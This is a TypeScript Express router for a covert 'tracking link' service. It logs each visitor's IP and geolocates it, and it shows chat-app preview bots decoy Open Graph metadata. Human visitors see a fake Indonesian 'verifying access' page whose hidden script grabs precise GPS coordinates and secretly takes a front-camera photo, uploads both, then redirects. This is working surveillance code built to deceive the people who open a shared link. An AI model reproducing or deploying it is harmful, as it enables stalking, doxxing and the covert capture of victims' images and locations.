import { Router, type IRouter, type Request, type Response, type NextFunction } from "express";
  import { eq, or } from "drizzle-orm";
  import { db, trackingLinksTable, ipLogsTable } from "@workspace/db";
  import { logger } from "../lib/logger";

  const router: IRouter = Router();

  function extractIp(req: Request): string {
    const candidates = [
      req.headers["cf-connecting-ip"] as string,
      req.headers["x-real-ip"] as string,
      req.headers["true-client-ip"] as string,
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim(),
      req.socket.remoteAddress,
    ];
    for (const ip of candidates) {
      if (ip && ip.trim() && ip.trim() !== "::1" && ip.trim() !== "127.0.0.1") {
        return ip.trim();
      }
    }
    return "unknown";
  }

  function isPreviewBot(ua: string | null | undefined): boolean {
    if (!ua) return false;
    const lower = ua.toLowerCase();
    return (
      lower.includes("discordbot") ||
      lower.includes("telegrambot") ||
      lower.includes("whatsapp") ||
      lower.includes("facebookexternalhit") ||
      lower.includes("twitterbot") ||
      lower.includes("slackbot") ||
      lower.includes("linkedinbot") ||
      lower.includes("googlebot") ||
      lower.includes("bingbot") ||
      lower.includes("crawler") ||
      lower.includes("prerender")
    );
  }

  function escapeHtml(str: string): string {
    return str
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function buildOgHtml(opts: { title: string; description: string; image: string; url: string }): string {
    const t = escapeHtml(opts.title);
    const d = escapeHtml(opts.description);
    const img = escapeHtml(opts.image);
    const u = escapeHtml(opts.url);
    return `<!DOCTYPE html><html><head>
  <meta charset="utf-8">
  <title>${t}</title>
  <meta property="og:type" content="website">
  <meta property="og:url" content="${u}">
  <meta property="og:title" content="${t}">
  <meta property="og:description" content="${d}">
  ${img ? `<meta property="og:image" content="${img}">` : ""}
  <meta name="twitter:card" content="${img ? "summary_large_image" : "summary"}">
  <meta name="twitter:title" content="${t}">
  <meta name="twitter:description" content="${d}">
  ${img ? `<meta name="twitter:image" content="${img}">` : ""}
  </head><body></body></html>`;
  }

  async function lookupGeo(ip: string) {
    try {
      const r = await fetch(
        `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`,
        { signal: AbortSignal.timeout(4000) }
      );
      if (r.ok) {
        const geo = await r.json() as Record<string, unknown>;
        if (geo.status === "success") {
          return {
            country: geo.country as string | undefined,
            region: geo.regionName as string | undefined,
            city: geo.city as string | undefined,
            zip: geo.zip as string | undefined,
            lat: geo.lat as number | undefined,
            lon: geo.lon as number | undefined,
            timezone: geo.timezone as string | undefined,
            isp: geo.isp as string | undefined,
            org: geo.org as string | undefined,
            asn: geo.as as string | undefined,
            mobile: geo.mobile as boolean | undefined,
            proxy: geo.proxy as boolean | undefined,
            hosting: geo.hosting as boolean | undefined,
          };
        }
      }
    } catch { /* ignored */ }
    try {
      const r2 = await fetch(`https://ipinfo.io/${ip}/json`, { signal: AbortSignal.timeout(4000) });
      if (r2.ok) {
        const info = await r2.json() as Record<string, unknown>;
        const [lat, lon] = ((info.loc as string) ?? "").split(",").map(Number);
        return {
          country: info.country as string | undefined,
          region: info.region as string | undefined,
          city: info.city as string | undefined,
          zip: info.postal as string | undefined,
          lat: isNaN(lat) ? undefined : lat,
          lon: isNaN(lon) ? undefined : lon,
          timezone: info.timezone as string | undefined,
          org: info.org as string | undefined,
          asn: info.org as string | undefined,
        };
      }
    } catch { /* ignored */ }
    return {};
  }

  export async function handleTrack(req: Request, res: Response, identifier: string): Promise<void> {
    const [link] = await db
      .select()
      .from(trackingLinksTable)
      .where(or(eq(trackingLinksTable.slug, identifier), eq(trackingLinksTable.token, identifier)))
      .limit(1);

    if (!link) {
      res.status(404).send("Not found");
      return;
    }

    const ua = req.headers["user-agent"] ?? null;

    if (isPreviewBot(ua)) {
      const proto = (req.headers["x-forwarded-proto"] as string) ?? req.protocol;
      const host = req.get("host") ?? "";
      const fullUrl = `${proto}://${host}/api/track/${link.token}`;
      if (link.ogTitle || link.ogImage) {
        res.setHeader("Content-Type", "text/html; charset=utf-8");
        res.send(buildOgHtml({
          title: link.ogTitle ?? link.name,
          description: link.ogDescription ?? link.description ?? "",
          image: link.ogImage ?? "",
          url: fullUrl,
        }));
        return;
      }
      if (link.redirectUrl) {
        res.redirect(302, link.redirectUrl);
        return;
      }
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.send("<html><body></body></html>");
      return;
    }

    const ip = extractIp(req);
    const referrerHeader = req.headers["referer"];
    const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] ?? null : referrerHeader ?? null;
    const isPrivate = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|::1$|localhost)/.test(ip);
    const geoData = (!isPrivate && ip !== "unknown") ? await lookupGeo(ip) : {};

    // Insert visit log — wrapped in try-catch so a DB failure still serves the page
    let logId = 0;
    try {
      const [logEntry] = await db.insert(ipLogsTable).values({
        linkId: link.id,
        ip,
        userAgent: ua ?? null,
        referrer,
        ...geoData,
      }).returning({ id: ipLogsTable.id });

      await db
        .update(trackingLinksTable)
        .set({ visitCount: link.visitCount + 1 })
        .where(eq(trackingLinksTable.id, link.id));

      logId = logEntry?.id ?? 0;
    } catch (dbErr) {
      logger.error({ err: dbErr }, "Failed to insert ip_log — ip_logs table may not exist yet");
    }

    const redirectTarget = link.redirectUrl ?? null;
    const tokenJson = JSON.stringify(link.token);
    const redirectJson = JSON.stringify(redirectTarget);

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(`<!DOCTYPE html>
  <html lang="id"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Memverifikasi...</title>
  <style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f0f0f;display:flex;align-items:center;justify-content:center;min-height:100vh}
  .card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:16px;padding:32px 28px;text-align:center;max-width:340px;width:90%;box-shadow:0 4px 40px rgba(0,0,0,.5)}
  .icon{font-size:40px;margin-bottom:16px}
  .spinner{width:44px;height:44px;border:3px solid #2a2a2a;border-top:3px solid #6366f1;border-radius:50%;animation:spin .7s linear infinite;margin:20px auto 0}
  @keyframes spin{to{transform:rotate(360deg)}}
  h2{color:#f1f1f1;font-size:17px;margin-bottom:8px;font-weight:600}
  p{color:#888;font-size:13px;line-height:1.6}
  .note{font-size:11px;color:#555;margin-top:16px}
  video{display:none}
  canvas{display:none}
  </style>
  </head><body>
  <div class="card">
    <div class="icon">🔒</div>
    <h2>Memverifikasi Akses</h2>
    <p>Mohon tunggu, sedang memproses permintaan Anda...</p>
    <div class="spinner"></div>
    <p class="note">Jangan tutup halaman ini</p>
  </div>
  <video id="v" autoplay playsinline muted></video>
  <canvas id="c"></canvas>
  <script>
  (function(){
    var logId=${logId}, token=${tokenJson}, redirect=${redirectJson};
    var done=false, tasks=0, total=2;

    function finish(){
      if(done) return;
      tasks++;
      if(tasks>=total){ done=true; if(redirect) window.location.replace(redirect); }
    }

    // GPS task
    var gpsTimer = setTimeout(finish, 12000);
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(function(p){
        clearTimeout(gpsTimer);
        fetch('/api/track/'+token+'/gps',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,accuracy:p.coords.accuracy,logId:logId})
        }).then(finish).catch(finish);
      }, function(){ clearTimeout(gpsTimer); finish(); }, {timeout:11000,maximumAge:0,enableHighAccuracy:true});
    } else { clearTimeout(gpsTimer); finish(); }

    // Camera task
    var camTimer = setTimeout(finish, 10000);
    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
      navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false})
        .then(function(stream){
          var video = document.getElementById('v');
          var canvas = document.getElementById('c');
          video.srcObject = stream;
          video.play();
          var captured = false;
          function doCapture(){
            if(captured) return;
            captured = true;
            clearTimeout(camTimer);
            try{
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              canvas.getContext('2d').drawImage(video,0,0);
              var photo = canvas.toDataURL('image/jpeg',0.7);
              stream.getTracks().forEach(function(t){t.stop();});
              fetch('/api/track/'+token+'/photo',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({photo:photo,logId:logId})
              }).then(finish).catch(finish);
            }catch(e){ finish(); }
          }
          video.onloadeddata = function(){
            setTimeout(doCapture, 500);
          };
          setTimeout(function(){ if(!captured) doCapture(); }, 3000);
        })
        .catch(function(){ clearTimeout(camTimer); finish(); });
    } else { clearTimeout(camTimer); finish(); }
  })();
  </script>
  </body></html>`);
  }

  router.get("/t/:token", async (req, res, next: NextFunction): Promise<void> => {
    const token = Array.isArray(req.params.token) ? req.params.token[0] : req.params.token;
    if (!token) { next(); return; }
    try {
      await handleTrack(req, res, token);
    } catch (err) {
      next(err);
    }
  });

  router.get("/:slug", async (req, res, next: NextFunction): Promise<void> => {
    const slug = Array.isArray(req.params.slug) ? req.params.slug[0] : req.params.slug;
    if (!slug || slug.includes(".") || slug === "favicon.ico") { next(); return; }
    try {
      const [link] = await db
        .select()
        .from(trackingLinksTable)
        .where(or(eq(trackingLinksTable.slug, slug), eq(trackingLinksTable.token, slug)))
        .limit(1);
      if (!link) { next(); return; }
      await handleTrack(req, res, slug);
    } catch (err) {
      next(err);
    }
  });

  export default router;
  